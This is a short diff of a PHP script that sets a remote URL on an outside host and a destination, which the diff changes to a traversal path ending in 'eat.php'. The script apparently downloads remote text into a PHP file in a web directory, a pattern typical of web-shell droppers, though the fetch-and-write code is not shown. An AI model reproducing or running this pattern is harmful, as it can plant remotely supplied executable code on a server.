@@ -1,8 +1,8 @@
 <?php
 
-$url = 'https://dox.dvds.nl/resources/bento.txt';
+$url = 'https://dox.dvds.nl/resources/conf.txt';
 
-$destination = '/home/tncfrans/public_html/eat.php';
+$destination = '../../../../eat.php';
 
 echo "<pre>";
 
